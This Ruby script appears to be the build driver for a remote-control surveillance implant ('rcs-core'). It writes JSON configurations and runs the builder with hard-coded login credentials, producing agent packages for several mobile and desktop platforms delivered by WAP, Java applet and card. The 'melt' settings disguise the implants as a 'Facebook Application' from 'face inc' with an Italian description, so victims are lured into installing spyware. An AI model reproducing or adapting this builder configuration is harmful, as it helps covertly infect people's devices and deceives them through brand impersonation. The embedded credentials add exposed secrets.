#!/usr/bin/env ruby
require 'json'

USER = 'alor'
PASS = 'demorcss'
FACTORY = 'RCS_0000000001'

puts "Building all complex..."
###################################################################################################
params = {platform: 'wap',
          generate: {platforms: ['blackberry', 'android', 'symbian', 'winmo'],
                     binary: {demo: true, admin: true},
                     melt: {admin: true,
                            appname: 'facebook',
                            name: 'Facebook Application',
                            desc: 'Applicazione utilissima di social network',
                            vendor: 'face inc',
                            version: '1.2.3'},
                     sign: {edition: '5th3rd'}
                    }
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o wap.zip"
###################################################################################################
params = {platform: 'applet',
          generate: {platforms: ['osx', 'windows'],
                     binary: {demo: true, admin: false},
                     melt: {admin: false}
                    },
          melt: {appname: 'facebook'}
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o applet.zip"
###################################################################################################
params = {platform: 'card',
          generate: {platforms: ['winmo'],
                     binary: {demo: true}
                    }
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o card.zip"
###################################################################################################
puts "End"